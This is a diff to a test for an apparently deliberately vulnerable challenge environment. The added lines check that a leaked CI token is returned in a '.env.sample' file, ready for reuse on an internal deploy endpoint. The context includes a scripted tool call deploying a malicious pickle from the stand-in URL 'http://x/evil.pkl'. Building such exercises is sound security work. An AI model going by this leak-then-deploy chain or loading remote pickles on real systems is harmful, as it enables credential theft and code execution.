@@ -51,6 +51,13 @@ def test_full_chain_vulnerable_core_pass():
     client, store, chain_for = make_chain_client(
         {"HALCYON_MODE": "vulnerable"},
         [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
+    # S1 has to actually deliver the token to the participant, not just record
+    # the audit event -- core=="pass" alone would not catch an endpoint that
+    # fired SECRET_LEAK_DISCOVERED but returned {"content": ""}. The token in
+    # the body is what a participant copies into /internal/deploy.
+    tok = chain_for("p1").ci_token
+    blob = client.get("/source/blob", params={"session": "p1", "path": ".env.sample"}).json()
+    assert tok in blob["content"]
     _drive_full_chain(client, chain_for)
     assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "pass"
 
